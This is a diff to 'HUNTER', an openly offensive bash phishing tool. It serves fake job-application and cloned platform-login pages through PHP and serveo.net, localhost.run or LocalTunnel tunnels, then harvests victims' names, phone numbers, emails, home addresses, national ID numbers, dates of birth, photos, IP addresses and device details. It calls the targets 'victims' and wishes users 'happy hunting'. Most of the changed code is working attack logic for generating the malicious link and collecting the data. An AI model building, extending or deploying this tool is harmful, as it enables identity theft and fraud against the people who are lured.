@@ -1,17 +1,19 @@
 #!/usr/bin/env bash
 
 ### Name: HUNTER
-### Version: 1.0.0
+### Version: 1.1.1
+### Date: 12-04-2025 
 ### Author: evilfeonix
+### Website: http://evilfeonix.github.io
 ### Github: http://github.com/evilfeonix
-### Youtube: http://www.youtube.com/evilfeonix
+### Youtube: http://www.youtube.com/@evilfeonix
 
 
 ###  I'm currently learning bash scripting.
 ###  I used my little knowladge to read a premade script.
 ###  And i try to create this tool on my own, by adding more features.
 ###  If u like my work and u realy wanna contribute, am free.
-###  I may be slow to respond.
+###  I may be slow to respond. But that doesn't makes me so lazy.
 ###  Please mail me at evilfeonix@gmail.com if something is wrong (^-^).
 
 
@@ -62,7 +64,7 @@ function Desktop()
     printf "    ######## #  ##  # #  ##  # #  ##  # ###  ### #  ##### #     ## ########     \n"
     printf "    ######## #  ##  # ##    ## #  ##  # ###  ### #      # #  ##  # ########     \n"
     printf "    ######## #####  # ######## ###### # #### ### ######## ######## ########     \n"
-    printf "    ######## ###### # ####### ##### \033[1;37m\033[4;1mv[1.0.0]\033[0m\033[1;33m #### ####### ######## ########     \n"
+    printf "    ######## ###### # ####### ##### \033[1;37m\033[4;1mv[1.1.0]\033[0m\033[1;33m #### ####### ######## ########     \n"
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
     printf "    ######## ########    \033[1;37m\033[4;1mhttps://github.com/evilfeonix\033[0m\033[1;33m    ######## ########     \n"
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
@@ -75,7 +77,7 @@ function Desktop()
 function Android()
 {
     printf "\033[1;33m              PORWERED BY \033[1;37mEVILFEONIX\033[1;33m\n"          #  
-    printf "         /\  ____  __/|  ________\033[1;37mv\033[4;1m[1.0.0]\033[0m\033[1;33m__ \n"
+    printf "         /\  ____  __/|  ________\033[1;37mv\033[4;1m[1.1.0]\033[0m\033[1;33m__ \n"
     printf "        / / / / / / / | / /_  __/ ____/ __ \ \n"
     printf "       / /_/ / / / /  |/ / / / / __/ / /_/ / \n"
     printf "      / __  / /_/ / /|  / / / / /___/ _, _/  \n"
@@ -144,7 +146,7 @@ function install_LT()
     
     sleep 5
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Installing LocalTunnel using node.js";loading
-    npm install -g Localtunnel > /dev/null || { 
+    npm install -g localtunnel > /dev/null || { 
         sleep 2;
         printf "\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel not install!,\033[1;37m\n"; 
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Please check your internet connection\033[1;37m\n"; 
@@ -171,7 +173,7 @@ function redirection()
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mevilfeonix@gmail.com\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37mHUNTER\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
-    evilfeonix="https://github.com/evilfeonix/HUNTER" 
+    evilfeonix="https://github.com/evilfeonix/" 
     xdg-open $evilfeonix
     echo ""
     exit 0
@@ -267,7 +269,7 @@ function catch_victims()
             	printf "   \033[1;33mPlatform: \033[1;37m%s\n" $plat
             fi
 
-            if [[ $arch == "Unidentified" ]]; then
+            if [[ $arch == "Unidentified" || -z $arch ]]; then
             	printf "   \033[1;33marchitecture: \033[1;31m%s\n" $arch
             else
             	printf "   \033[1;33marchitecture: \033[1;37m%s\n" $arch
@@ -334,6 +336,7 @@ function catch_victims()
             victims=$(grep -a 'name' form.txt | cut -d "=" -f 2 | tr -d '\r')
             phone=$(grep -a 'phone' form.txt | cut -d "=" -f 2 | tr -d '\r')
             email=$(grep -a 'email' form.txt | cut -d "=" -f 2 | tr -d '\r')
+            prof=$(grep -a 'prof' form.txt | cut -d "=" -f 2 | tr -d '\r')
             state=$(grep -a 'state' form.txt | cut -d "=" -f 2 | tr -d '\r')
             lga=$(grep -a 'lga' form.txt | cut -d "=" -f 2 | tr -d '\r')
             homeaddr=$(grep -a 'home' form.txt | cut -d "=" -f 2 | tr -d '\r')
@@ -349,21 +352,22 @@ function catch_victims()
             rm -rf form.txt
 
             printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Personal information!";loading
-            printf "   \033[1;33mVictims Age: \033[1;37m%s\n" $age 
+            printf "   \033[1;33mAge: \033[1;37m%s\n" $age 
             printf "   \033[1;33mGender: \033[1;37m%s\n" $gender 
             printf "   \033[1;33mMarritan: \033[1;37m%s\n" $marry 
             printf "   \033[1;33mFull Name: \033[1;37m%s\n" $victims 
-            printf "   \033[1;33mDate-of-Birth: \033[1;37m%s\n" $dob 
+            printf "   \033[1;33mProfession: \033[1;37m%s\n" $prof 
             printf "   \033[1;33mPhone Number: \033[1;37m%s\n" $phone
             printf "   \033[1;33mEmail Address: \033[1;37m%s\n" $email 
-            printf "   \033[1;33mState they live: \033[1;37m%s\n" $state 
-            printf "   \033[1;33mCountry they live: \033[1;37m%s\n" $cty 
+            printf "   \033[1;33mDate-of-Birth: \033[1;37m%s\n" $dob 
+            printf "   \033[1;33mState (city): \033[1;37m%s\n" $state 
+            printf "   \033[1;33mNationality: \033[1;37m%s\n" $cty 
             printf "   \033[1;33mLocal Government Area: \033[1;37m%s\n" $lga 
-            printf "   \033[1;33mTheir Home Address: \033[1;37m%s\n" $homeaddr 
+            printf "   \033[1;33mHome Address: \033[1;37m%s\n" $homeaddr 
             printf "   \033[1;33mNational ID Number: \033[1;37m%s\n" $nin 
-            printf "   \033[1;33mTheir Current Occupation: \033[1;37m%s\n" $occ 
+            printf "   \033[1;33mLast/Current Occupation: \033[1;37m%s\n" $occ 
             
-            if [[ $galary == "Unable_to_upload_victims_photo_from_their_galary" ]]; then
+            if [[ $galary == "Unable_to_upload_victims_photo_to_the_server" ]]; then
             	printf "   \n\033[1;33mVictims Galary Pic: \033[1;31m%s\n" $galary 
             else
             	printf "   \n\033[1;33mVictims Galary Pic: \033[1;37m%s\n" $galary
@@ -386,7 +390,7 @@ function catch_victims()
                 printf "\033[1;32mRed Flag: \033[1;97mdone_with_the_information_hunting!,\e[0m\n"
                 if [[ $temp -eq 3 || $temp -eq 4 ]]; then
                     printf "\033[1;32mImportant Note: \033[1;97mif_you_want_victims_personal_information_to_be_hunted. \e[0m\n"
-                    printf "\033[1;32mImportant Note: \033[1;97mthen_you_gotta_select_either_\033[1;32m01\033[1;37m_or_\033[1;32m02\033[1;37m_in_the_template_served_ section. \e[0m\n" 
+                    printf "\033[1;32mImportant Note: \033[1;97mthen_you_gotta_select_either_\033[1;32m01\033[1;37m_or_\033[1;32m02\033[1;37m_in_the_template_section. \e[0m\n" 
                 fi
                 break
             fi
@@ -410,7 +414,7 @@ function catch_victims()
 
         sleep 0.5
         if [[ -e "image.txt" ]]; then
-            file=$(grep -a 'filename' image.txt | cut -d "=" -f 2 | tr -d '\r')
+            file=$(grep -a 'file' image.txt | cut -d "=" -f 2 | tr -d '\r')
             rm -rf image.txt
             printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Victims picture received!\033[0m";loading
             printf "   \033[1;33mSaved at: \033[1;37m%s\n" $file 
@@ -428,7 +432,7 @@ function catch_victims()
             printf "\n\033[1;33m[\033[1;37m++\033[1;33m] User Agent can not be found in victims browser\033[1;37m\n"
         fi
         printf "\n\033[1;33m[\033[1;37m++\033[1;33m] All information hunted from \033[1;37m$victims\033[1;33m by name, \033[1;37m$ip\033[1;33m by ip address\033[1;37m\n"
-        printf "\033[1;33m[\033[1;37m++\033[1;33m] Has been saved in \033[1;37m$dir\033[1;33m file\033[1;37m\n"
+        printf "\033[1;33m[\033[1;37m++\033[1;33m] Has been saved in \033[1;37m$dir\033[1;33m path\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] For more information regardless to this tool\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mevilfeonix@gmail.com\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
@@ -437,14 +441,14 @@ function catch_victims()
         printf "\n\033[1;33m[\033[1;37m++\033[1;33m] No information was hunted from victims!\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Make sure you sent the generated malicious link to victim\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] If victims visit our malicious link, their informations will be hunted\033[1;37m\n"
-        printf "\033[1;33m[\033[1;37m++\033[1;33m] And also, it will be sent back to you, and saved it in a dedicated file\033[1;37m\n"
+        printf "\033[1;33m[\033[1;37m++\033[1;33m] And also, it will be sent back to you, and also saved it in a dedicated file\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] For more information regardless to this tool\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mevilfeonix@gmail.com\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37m\033[1;37mHUNTER\033[1;33m\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
     fi
 
-    evilfeonix="https://github.com/evilfeonix/HUNTER"
+    evilfeonix="https://github.com/evilfeonix/"
     xdg-open $evilfeonix
     echo ""
     exit 0
@@ -498,18 +502,18 @@ function template()
         subdomain="jobapplicationform-$RANDOM"
         temp=1
     elif [[ $temp == 4 ]] || [[ $temp == 04 ]]; then
-        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter Platform Name:\033[1;37m ' SplatName
-        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Copy and Paste "'$SplatName'" Login URL:\033[1;37m ' Splatform
-        SplatName="${SplatName//[[:space:]]/}"
-        while [[  -z $SplatName || -z $Splatform ]]
+        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter Platform Name:\033[1;37m ' platformName
+        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Copy and Paste "'$platformName'" Login URL:\033[1;37m ' platformURL
+        platformName="${platformName//[[:space:]]/}"
+        while [[  -z $platformName || -z $platformURL ]]
         do
             printf '\033[1;31m[\033[1;37m!!\033[1;31m] Platform Name and it Login URL can not be empty.\033[0m\n'
             sleep 1
-            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter Platform Name:\033[1;37m ' SplatName
-            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-copy and Re-paste it Login URL:\033[1;37m ' Splatform
-            videoID="${SplatName//[[:space:]]/}"
+            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter Platform Name:\033[1;37m ' platformName
+            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-copy and Re-paste it Login URL:\033[1;37m ' platformURL
+            videoID="${platformName//[[:space:]]/}"
         done
-        subdomain="$SplatName-$RANDOM"
+        subdomain="$platformName-$RANDOM"
         temp=4
     else
         printf '\n\033[1;31m[\033[1;37m!!\033[1;31m] Invalid template option!, try again.\033[0m\n'
@@ -538,8 +542,8 @@ function templateSetup()
         sed 's+malicious_link+'$mal_link'+g' applicant.html > index2.html
     else
         sed 's+malicious_link+'$mal_link'+g' platform.html > index3.html
-        sed 's+plat_link+'$Splatform'+g' index3.html > index4.html
-        sed 's+plat_name+'$SplatName'+g' index4.html > index2.html
+        sed 's+plat_link+'$platformURL'+g' index3.html > index4.html
+        sed 's+plat_name+'$platformName'+g' index4.html > index2.html
         rm -rf index4.html
     fi
     rm -rf index3.html
@@ -560,7 +564,9 @@ function localhost()
 
     addr="127.0.0.1:31301"
     printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
-    fuser -k 31301/tcp > /dev/null 2>&1
+    pid=$(pidof php)
+
+    kill pid > /dev/null 2>&1 
     php -S $addr 1> /dev/null 2> maliciouslink &
     sleep 3
 
@@ -576,36 +582,61 @@ function localtunnel()
 {   
     command -v lt > /dev/null 2>&1  || command -v npm > /dev/null 2>&1 || { 
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, npm node.js is missing.\n"; 
-        printf "\033[1;33m[\033[1;37m++\033[1;33m] But we can automatically install it for you togather with the LocalTunnel.\n"; 
+        printf "\033[1;33m[\033[1;37m++\033[1;33m] But we can automatically install it togather with the LocalTunnel.\n"; 
         install_LT;
     }
 
-    # addr="127.0.0.1:31301"
-    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
-    fuser -k 31301/tcp > /dev/null 2>&1
+    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php";loading
+    pid=$(pidof php)
+    kill pid > /dev/null 2>&1
     php -S localhost:31301 > /dev/null 2>&1 &
     sleep 3
 
-    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting LocalTunnel server";loading
+    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting LocalTunnel";loading
     lt --port 31301 2> sshError > maliciouslink &
-    sleep 5
+    sleep 7
 
-    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
-    if [[ -e linkerror ]]; then
-        if [[ -s linkerror ]]; then
-            rm -rf linkerror
-        else
-            err=$(cat linkerror)
-            printf "\033[1;31m[\033[1;37m--\033[1;31m] Generating malicious link error: " $err
+    if [[ -e sshError ]]; then
+        conn=$(grep -a "Connection refused" sshError)
+        resolve=$(grep -a "Could not resolve hostname" sshError)
+
+        if [[ -n $conn ]]; then
+            printf '\n\033[1;31m[\033[1;37m--\033[1;31m] ssh: connect to host serveo.net port 22: Connection refused!\n'
+            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Hmm!, several reasons may caused this error, here are some tips to try.\n'
+            printf '   01. Verify ssh port by checking the ssh configuration.\n'
+            printf '        cmd (`\033[1;37mgrep -a Port /etc/ssh/sshd_conig\033[1;31m`).\n'
+            printf '   02. Enable ssh access on your machine, by starting the ssh.\n'
+            printf '        cmd (`\033[1;37msudo service ssh start\033[1;31m`).\n'
+            printf '   03. It may be posible that the firewall is blocking ssh connections.\n'
+            printf '        cmd (`\033[1;37mufw allow 22\033[1;31m`).\n'
+            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Feel free to contact us for more solution.\033[0m\n'
+            rm -rf sshError
+            rm -rf maliciouslink
+            exit 1
+
+        elif [[ -n $resolve ]]; then
+            printf '\n\033[1;31m[\033[1;37m--\033[1;31m] Could not Resolve Hostname localhost.run!\n'
+            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Check Your Internet Connection.\033[0m\n'
+            rm -rf sshError
+            rm -rf maliciouslink
             exit 1
         fi
-        rm -rf linkerror
-        rm -rf maliciouslink
+        rm -rf sshError
     fi
+    
+    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
+    sleep 3
 
-    mal_link=$(grep -o "https://[a-zA-Z0-9.-]*" maliciouslink | head -n 1)    #.loca.lt
-    rm -rf maliciouslink
-    sleep 2
+    if [[ -s maliciouslink ]]; then
+        mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\.loca.lt" maliciouslink | head -n 1)    #
+        rm -rf maliciouslink
+        sleep 2
+    else
+        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!./033[0m\n"
+        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go buy some./033[0m\n"
+        rm -rf maliciouslink
+        exit 1
+    fi
     
     templateSetup
 }
@@ -624,49 +655,58 @@ function serveo()
         exit 1; 
     }
 
-    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
-    fuser -k 31301/tcp > /dev/null 2>&1
+    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php";loading
+
+    pid=$(pidof php)
+    kill pid > /dev/null 2>&1
     php -S localhost:31301 > /dev/null 2>&1 &
     sleep 3
 
-    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting serveo.net server";loading
-    ssh -o StrictHostKeyChecking=no -R $subdomain:80:localhost:31301 serveo.net 2> sshError > maliciouslink &
+    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting serveo.net";loading
+    ssh -o StrictHostKeyChecking=no -R 80:localhost:31301 serveo.net 2> sshError > maliciouslink &
+    sleep 7
 
-    # Wait for Serveo to establish the tunnel
-    sleep 5
     if [[ -e sshError ]]; then
         conn=$(grep -a "Connection refused" sshError)
-        resolve=$(grep -a "Temporary failure" sshError)
+        resolve=$(grep -a "Could not resolve hostname" sshError)
 
         if [[ -n $conn ]]; then
             printf '\n\033[1;31m[\033[1;37m--\033[1;31m] ssh: connect to host serveo.net port 22: Connection refused!\n'
             printf '\033[1;31m[\033[1;37m!!\033[1;31m] Hmm!, several reasons may caused this error, here are some tips to try.\n'
             printf '   01. Verify ssh port by checking the ssh configuration.\n'
-            printf '        cmd (`\033[1;37mgreb -a Port /etc/ssh/sshd_conig\033[1;31m`).\n'
+            printf '        cmd (`\033[1;37mgrep -a Port /etc/ssh/sshd_conig\033[1;31m`).\n'
             printf '   02. Enable ssh access on your machine, by starting the ssh.\n'
             printf '        cmd (`\033[1;37msudo service ssh start\033[1;31m`).\n'
             printf '   03. It may be posible that the firewall is blocking ssh connections.\n'
             printf '        cmd (`\033[1;37mufw allow 22\033[1;31m`).\n'
             printf '\033[1;31m[\033[1;37m!!\033[1;31m] Feel free to contact us for more solution.\033[0m\n'
+            rm -rf sshError
+            rm -rf maliciouslink
+            exit 1
+
         elif [[ -n $resolve ]]; then
             printf '\n\033[1;31m[\033[1;37m--\033[1;31m] Could not Resolve Hostname serveo.net!\n'
             printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Check Your Internet Connection.\033[0m\n'
-        else
-            cmd=$(cat sshError)
-            printf "\n\033[1;31m[\033[1;37m--\033[1;31m] $cmd!\n" 
-
+            rm -rf sshError
+            rm -rf maliciouslink
+            exit 1
         fi
         rm -rf sshError
-        rm -rf maliciouslink
-        exit 1
     fi
     
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
     sleep 3
 
-    mal_link=$(grep -o "https://[a-z0-9A-Z.-]*" maliciouslink | head -n 1)      #serveo.net
-    rm -rf maliciouslink
-    sleep 2
+    if [[ -s maliciouslink ]]; then
+        mal_link=$(grep -o "https://[a-z0-9A-Z.-]*\serveo.net" maliciouslink | head -n 1)      #
+        rm -rf maliciouslink
+        sleep 2
+    else
+        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!./033[0m\n"
+        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go buy some./033[0m\n"
+        rm -rf maliciouslink
+        exit 1
+    fi
     
     templateSetup
 }
@@ -686,49 +726,58 @@ function localXposer()
         exit 1; 
     }
 
-    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
-    fuser -k 31301/tcp > /dev/null 2>&1
+    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php";loading
+
+    pid=$(pidof php)
+    kill pid > /dev/null 2>&1
     php -S localhost:31301 > /dev/null 2>&1 &
     sleep 3
 
-    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting localhost.run server";loading
+    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting localhost.run";loading
     ssh -o StrictHostKeyChecking=no -R 80:localhost:31301 nokey@localhost.run 2> sshError > maliciouslink &
-    
-    # Wait for localhost.run to establish the tunnel
-    sleep 5
+    sleep 7
+
     if [[ -e sshError ]]; then
         conn=$(grep -a "Connection refused" sshError)
-        resolve=$(grep -a "Temporary failure" sshError)
+        resolve=$(grep -a "Could not resolve hostname" sshError)
 
         if [[ -n $conn ]]; then
             printf '\n\033[1;31m[\033[1;37m--\033[1;31m] ssh: connect to host serveo.net port 22: Connection refused!\n'
             printf '\033[1;31m[\033[1;37m!!\033[1;31m] Hmm!, several reasons may caused this error, here are some tips to try.\n'
             printf '   01. Verify ssh port by checking the ssh configuration.\n'
-            printf '        cmd (`\033[1;37mgreb -a Port /etc/ssh/sshd_conig\033[1;31m`).\n'
+            printf '        cmd (`\033[1;37mgrep -a Port /etc/ssh/sshd_conig\033[1;31m`).\n'
             printf '   02. Enable ssh access on your machine, by starting the ssh.\n'
             printf '        cmd (`\033[1;37msudo service ssh start\033[1;31m`).\n'
             printf '   03. It may be posible that the firewall is blocking ssh connections.\n'
             printf '        cmd (`\033[1;37mufw allow 22\033[1;31m`).\n'
             printf '\033[1;31m[\033[1;37m!!\033[1;31m] Feel free to contact us for more solution.\033[0m\n'
+            rm -rf sshError
+            rm -rf maliciouslink
+            exit 1
+
         elif [[ -n $resolve ]]; then
             printf '\n\033[1;31m[\033[1;37m--\033[1;31m] Could not Resolve Hostname localhost.run!\n'
             printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Check Your Internet Connection.\033[0m\n'
-        else
-            cmd=$(cat sshError)
-            printf "\n\033[1;31m[\033[1;37m--\033[1;31m] $cmd!\n" 
-
+            rm -rf sshError
+            rm -rf maliciouslink
+            exit 1
         fi
         rm -rf sshError
-        rm -rf maliciouslink
-        exit 1
     fi
     
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
     sleep 3
 
-    mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\." maliciouslink | head -n 1)   #lhr.life
-    rm -rf maliciouslink
-    sleep 2
+    if [[ -s maliciouslink ]]; then
+        mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\.lhr.life" maliciouslink | head -n 1)   #
+        rm -rf maliciouslink
+        sleep 2
+    else
+        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!./033[0m\n"
+        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go buy some./033[0m\n"
+        rm -rf maliciouslink
+        exit 1
+    fi
     
     templateSetup
 }
@@ -739,9 +788,9 @@ function tunnel()
     default_server="1"
     printf "\n\033[1;37m-------\033[1;33mTunnel Servers\033[1;37m-------\n\n"    
     printf "   \033[1;33m[\033[1;37m01\033[1;33m] Localhost\n"
-    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Serveo.net\n"
-    printf "   \033[1;33m[\033[1;37m03\033[1;33m] LocalTunnel\n"
-    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Localhost.run\n\n"
+    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Serveo.Net\n"
+    printf "   \033[1;33m[\033[1;37m03\033[1;33m] Localhost.Run\n"
+    printf "   \033[1;33m[\033[1;37m04\033[1;33m] LocalTunnel \033[1;37m(\033[1;31mUnder Maintainance\033[1;37m)\n\n"
     read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose a Port Forwarding [\033[1;37mDefault is 1\033[1;33m]:\033[1;37m ' server
     if [[ $server -gt 4 && $server -lt 1 ]]; then
         printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Port Forwarding Option!\n"
@@ -759,9 +808,9 @@ function tunnel()
     elif [[ $server == 2 ]] || [[ $server == 02 ]]; then
         serveo
     elif [[ $server == 3 ]] || [[ $server == 03 ]]; then
-        localtunnel
-    elif [[ $server == 4 ]] || [[ $server == 04 ]]; then
         localXposer
+    elif [[ $server == 4 ]] || [[ $server == 04 ]]; then
+        localtunnel
     else
         printf "\n\033[1;31m[\033[1;37m!!\033[1;31m] Invalid port forwarding, try again!\033[0m\n"
         sleep 1
@@ -775,13 +824,14 @@ function aboutUS()
     clear
     banner
     printf "\n\033[1;37m-------\033[1;33mAbout Tool\033[1;37m-------\n\n"    
-    printf "   \033[1;33mVersion        \033[1;37m1.0.0\n"
+    printf "   \033[1;33mVersion        \033[1;37m1.1.0\n"
     printf "   \033[1;33mTool Name      \033[1;37m\033[1;37mHUNTER\033[1;33m\n"
     printf "   \033[1;33mAuthor         \033[1;37mevilfeonix\n"
-    printf "   \033[1;33mLatest Update  \033[1;37m12-03-2025\n"
+    printf "   \033[1;33mLatest Update  \033[1;37m11-08-2025\n"
     printf "   \033[1;33mGitub          \033[1;37mDigital Firebird\n"
     printf "   \033[1;33mYoutube        \033[1;37mDigital Firebird\n"
-    printf "   \033[1;33mEmail          \033[1;37mevilfeonix@gmail.com\n\n"
+    printf "   \033[1;33mEmail          \033[1;37mevilfeonix@gmail.com\n"
+    printf "   \033[1;33mWebsite        \033[1;37mhttps://evilfeonix.github.io\n\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Subscribe to our youtube channel \033[1;33m[\033[1;37m++\033[1;33m]\n"
     read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Press [\033[1;37mENTER\033[1;33m] to countinue'
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Loading!.., Please wait";loading
@@ -795,7 +845,7 @@ function guide()
     clear
     banner
     printf "\n\033[1;37m-------\033[1;33mHow to use \033[1;37mHUNTER\033[1;33m\033[1;37m-------\n\n"
-    printf "\033[1;33m[\033[1;37mStep 1\033[1;33m] In the main menu, select the third option (03).\n"
+    printf "\033[1;33m[\033[1;37mStep 1\033[1;33m] In the main menu, select the fifth option (05).\n"
     printf "\033[1;33m[\033[1;37mStep 2\033[1;33m] Then choose a tunnel server, we gonna use localhost on this tutorial.\n"
     printf "\033[1;33m[\033[1;37mStep 3\033[1;33m] Select a tunnel server, the first option (01).\n"
     printf "\033[1;33m[\033[1;37mStep 4\033[1;33m] Select a template that will be use to atract victims attention in order to collect their datas.\n"
